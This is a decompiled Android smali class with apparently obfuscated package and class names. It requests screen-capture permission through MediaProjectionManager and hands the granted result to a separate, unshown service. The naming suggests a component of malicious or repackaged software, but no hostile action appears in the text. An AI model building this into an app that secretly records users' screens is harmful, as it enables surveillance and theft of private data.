.class public Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/cwwzcpcu;
.super Landroid/app/Activity;


# instance fields
.field private a:Landroid/media/projection/MediaProjectionManager;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 1

    const v0, 0xe93a

    if-ne p1, v0, :cond_0

    const/4 p1, -0x1

    if-ne p2, p1, :cond_0

    new-instance p1, Landroid/content/Intent;

    const-class v0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/jkeggfql;

    invoke-direct {p1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v0, "resultCode"

    invoke-virtual {p1, v0, p2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object p1

    const-string p2, "resultIntent"

    invoke-virtual {p1, p2, p3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    move-result-object p1

    invoke-virtual {p0, p1}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/cwwzcpcu;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_0
    invoke-virtual {p0}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/cwwzcpcu;->finish()V

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 1
    .annotation build Landroid/annotation/TargetApi;
        value = 0x15
    .end annotation

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const-string p1, "media_projection"

    invoke-virtual {p0, p1}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/cwwzcpcu;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/media/projection/MediaProjectionManager;

    iput-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/cwwzcpcu;->a:Landroid/media/projection/MediaProjectionManager;

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/cwwzcpcu;->a:Landroid/media/projection/MediaProjectionManager;

    invoke-virtual {p1}, Landroid/media/projection/MediaProjectionManager;->createScreenCaptureIntent()Landroid/content/Intent;

    move-result-object p1

    const v0, 0xe93a

    invoke-virtual {p0, p1, v0}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/cwwzcpcu;->startActivityForResult(Landroid/content/Intent;I)V

    return-void
.end method
